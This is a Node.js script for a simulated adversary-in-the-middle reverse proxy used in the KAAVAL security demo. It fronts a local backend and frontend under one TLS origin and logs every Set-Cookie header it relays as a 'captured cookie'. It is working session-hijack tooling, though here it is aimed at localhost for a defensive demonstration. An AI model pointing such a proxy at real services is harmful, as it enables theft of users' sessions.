#!/usr/bin/env node
// =============================================================================
//  KAAVAL ATTACKER PROXY  —  SIMULATED AiTM REVERSE PROXY, DEMO USE ONLY
// =============================================================================
//
// Companion to KAAVAL_Demo_LAN_Reengineering.md §3.5. This is the "attacker /
// host" box in the two-laptop topology (§2): it terminates TLS at
// https://kaaval.demo using an mkcert-trusted certificate and forwards every
// request into the demo stack, logging Set-Cookie headers as they pass — the
// exact AiTM cookie-capture the whole demo is built to defeat.
//
// WHY THIS IS PATH-AWARE (a deliberate extension of the doc's §3.5 snippet):
//
//   The doc's §3.5 example forwards everything to a single target (the
//   frontend, :3000) and §3.7 assumes Next.js *rewrites* carry /auth, /api,
//   /events, /radar, /guardian and /chronicle on to the backend (:8000).
//   Those rewrites do not exist in this repository, and every client (the
//   demo page, the dashboard, the SDK) calls the backend at an absolute
//   origin. Over the LAN, a single-target proxy would therefore leave the
//   browser unable to reach the backend at all (mixed-content / wrong host),
//   and Scenes 1-5 could not run.
//
//   So this proxy does the routing the missing rewrites would have done:
//   backend path prefixes go to the FastAPI gateway, everything else goes to
//   the Next.js app. The result is a single trusted origin, https://kaaval.demo,
//   that fronts both — which is exactly the topology §2 draws. No frontend or
//   backend source is changed to achieve it.
//
// Implemented with Node's built-in http/https only — no third-party proxy
// library — so there is no `npm install` step to fail on stage.
//
// Env vars (all optional):
//   PORT              listen port for TLS            (default 443)
//   BACKEND_TARGET    FastAPI gateway origin         (default http://127.0.0.1:8000)
//   FRONTEND_TARGET   Next.js app origin             (default http://127.0.0.1:3000)
//   TARGET            alias for FRONTEND_TARGET       (doc §3.5 compatibility)
//   CERT_DIR          dir holding the cert pair       (default ./certs next to this file)
//   CERT_NAME         cert basename                   (default kaaval.demo)

"use strict";

const http = require("http");
const https = require("https");
const fs = require("fs");
const path = require("path");
const { URL } = require("url");

const PORT = parseInt(process.env.PORT || "443", 10);
const BACKEND_TARGET = process.env.BACKEND_TARGET || "http://127.0.0.1:8000";
const FRONTEND_TARGET =
  process.env.FRONTEND_TARGET || process.env.TARGET || "http://127.0.0.1:3000";
const CERT_DIR = process.env.CERT_DIR || path.join(__dirname, "certs");
const CERT_NAME = process.env.CERT_NAME || "kaaval.demo";

// Request path prefixes owned by the FastAPI gateway (mirrors backend/main.py
// router prefixes). Anything not matching one of these is a frontend asset or
// page and is sent to Next.js.
const BACKEND_PREFIXES = [
  "/auth",
  "/api",
  "/events",
  "/radar",
  "/guardian",
  "/chronicle",
  "/health",
];

const keyPath = path.join(CERT_DIR, `${CERT_NAME}-key.pem`);
const certPath = path.join(CERT_DIR, `${CERT_NAME}.pem`);

for (const [label, p] of [["key", keyPath], ["cert", certPath]]) {
  if (!fs.existsSync(p)) {
    console.error(
      `[attacker-proxy] FATAL: TLS ${label} not found at ${p}\n` +
        `  Generate it on this (attacker/host) laptop with mkcert, per\n` +
        `  KAAVAL_Demo_LAN_Reengineering.md §3.2:\n` +
        `      mkcert -install\n` +
        `      mkcert ${CERT_NAME}\n` +
        `  then move ${CERT_NAME}.pem and ${CERT_NAME}-key.pem into ${CERT_DIR}/`,
    );
    process.exit(1);
  }
}

const tlsOptions = {
  key: fs.readFileSync(keyPath),
  cert: fs.readFileSync(certPath),
};

function pickTarget(reqUrl) {
  const pathname = reqUrl.split("?")[0];
  const isBackend = BACKEND_PREFIXES.some(
    (prefix) => pathname === prefix || pathname.startsWith(prefix + "/"),
  );
  return isBackend ? BACKEND_TARGET : FRONTEND_TARGET;
}

function logCaptured(kind, req, headers) {
  const setCookie = headers["set-cookie"];
  if (setCookie) {
    // The money shot: this is precisely what an AiTM proxy steals in the wild.
    console.log(
      "[captured cookie]",
      JSON.stringify({
        time: new Date().toISOString(),
        via: kind,
        path: req.url,
        cookies: setCookie,
      }),
    );
  }
}

const server = https.createServer(tlsOptions, (req, res) => {
  const target = new URL(pickTarget(req.url));

  const headers = { ...req.headers };
  // Rewrite Host to the upstream so uvicorn/Next accept the request; preserve
  // the browser-facing values for anything that wants them. The session cookie
  // sets no Domain, so the browser keys it to kaaval.demo regardless of this.
  headers.host = target.host;
  headers["x-forwarded-host"] = req.headers.host || "kaaval.demo";
  headers["x-forwarded-proto"] = "https";
  headers["x-forwarded-for"] = req.socket.remoteAddress || "";

  const upstream = http.request(
    {
      protocol: target.protocol,
      hostname: target.hostname,
      port: target.port || 80,
      method: req.method,
      path: req.url,
      headers,
    },
    (upstreamRes) => {
      logCaptured("http", req, upstreamRes.headers);
      res.writeHead(upstreamRes.statusCode || 502, upstreamRes.headers);
      upstreamRes.pipe(res); // streams responses, incl. SSE /events/stream
    },
  );

  upstream.on("error", (err) => {
    console.error(`[attacker-proxy] upstream error for ${req.url}:`, err.message);
    if (!res.headersSent) {
      res.writeHead(502, { "content-type": "application/json" });
    }
    res.end(
      JSON.stringify({
        error: "bad_gateway",
        detail: `proxy could not reach ${target.origin}`,
      }),
    );
  });

  req.pipe(upstream); // streams request bodies
});

// Forward WebSocket upgrades (Next.js dev HMR) to the frontend so the demo
// page hot-reloads normally behind the proxy.
server.on("upgrade", (req, socket, head) => {
  const target = new URL(FRONTEND_TARGET);
  const headers = { ...req.headers, host: target.host };
  const upstream = http.request({
    hostname: target.hostname,
    port: target.port || 80,
    method: req.method,
    path: req.url,
    headers,
  });
  upstream.on("upgrade", (upstreamRes, upstreamSocket, upstreamHead) => {
    const lines = [
      "HTTP/1.1 101 Switching Protocols",
      ...Object.entries(upstreamRes.headers).map(([k, v]) => `${k}: ${v}`),
      "\r\n",
    ];
    socket.write(lines.join("\r\n"));
    if (upstreamHead && upstreamHead.length) socket.write(upstreamHead);
    upstreamSocket.pipe(socket);
    socket.pipe(upstreamSocket);
  });
  upstream.on("error", () => socket.destroy());
  if (head && head.length) upstream.write(head);
  upstream.end();
});

server.on("clientError", (err, socket) => {
  if (socket.writable) socket.end("HTTP/1.1 400 Bad Request\r\n\r\n");
});

server.listen(PORT, () => {
  console.log(`[attacker-proxy] TLS listening on https://${CERT_NAME}:${PORT}`);
  console.log(`[attacker-proxy]   backend paths -> ${BACKEND_TARGET}`);
  console.log(`[attacker-proxy]   everything else -> ${FRONTEND_TARGET}`);
  console.log(`[attacker-proxy]   capturing Set-Cookie headers (AiTM demo)`);
});

server.on("error", (err) => {
  if (err.code === "EACCES") {
    console.error(
      `[attacker-proxy] FATAL: cannot bind port ${PORT} (needs privilege).\n` +
        `  Run with sudo, or pick a high port: PORT=8443 node attacker-proxy.js\n` +
        `  (then browse to https://${CERT_NAME}:8443)`,
    );
  } else if (err.code === "EADDRINUSE") {
    console.error(`[attacker-proxy] FATAL: port ${PORT} already in use.`);
  } else {
    console.error("[attacker-proxy] FATAL:", err.message);
  }
  process.exit(1);
});
